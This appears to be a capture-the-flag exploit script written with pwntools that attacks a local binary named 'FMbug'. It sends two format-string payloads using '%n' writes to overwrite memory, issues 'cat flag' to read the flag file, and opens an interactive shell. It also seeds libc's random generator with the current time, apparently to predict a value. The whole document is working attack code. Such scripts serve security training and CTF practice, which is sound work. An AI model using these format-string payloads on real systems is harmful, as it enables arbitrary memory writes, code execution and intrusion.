from pwn import *
import ctypes

LIBC = ctypes.cdll.LoadLibrary('libc-2.23.so')
seed = LIBC.time(0)
LIBC.srand(seed)
v3 = LIBC.rand()

s = process('./FMbug')

s.recvuntil('input : ')
s.sendline('%134520844s%70$n')

s.recvuntil('input : ')
s.sendline('%134514459s%77$n')

s.recvuntil('input : ')
s.recv()
s.sendline('cat flag')
s.interactive()
